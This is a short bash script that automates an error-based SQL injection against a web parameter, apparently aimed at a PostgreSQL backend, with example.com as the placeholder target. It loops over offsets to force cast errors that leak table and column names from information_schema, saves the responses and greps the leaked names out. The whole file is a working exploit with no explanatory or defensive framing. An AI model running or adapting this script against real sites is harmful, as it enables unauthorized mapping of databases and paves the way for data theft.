#!/bin/bash

for i in $(seq 1 200); do
 z="http://example.com/?action=contents&order=ASC%20limit%20cast%28%28select%20concat%28table_name,column_name%29%20from%20information_schema.columns%20limit%201%20offset%20$i%29%20as%20int%29"
#echo $z;
wget $z -O "out/"$i;

done;


cat out/*|sed -e 's/integer\:/\ninteger/g'|grep integer|grep -v "pg_"
